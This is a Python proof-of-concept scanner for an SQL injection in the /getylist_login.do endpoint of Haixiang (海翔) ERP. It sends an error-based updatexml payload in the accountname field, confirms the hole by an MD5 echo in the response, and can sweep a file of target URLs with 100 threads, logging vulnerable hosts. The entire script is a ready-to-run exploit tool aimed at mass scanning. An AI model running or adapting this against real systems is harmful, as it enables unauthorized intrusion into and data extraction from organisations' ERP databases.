# 海翔ERP_getylist_login.do_SQL注入漏洞
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    api = "/getylist_login.do"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
    try:
        res = requests.post(url=target + api, headers=headers, data=data, verify=False, timeout=10)
        if res.status_code == 500 and 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
            print(f"[+]{target}存在SQL注入")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parse = argparse.ArgumentParser(description="海翔ERP_getylist_login.do_SQL注入漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()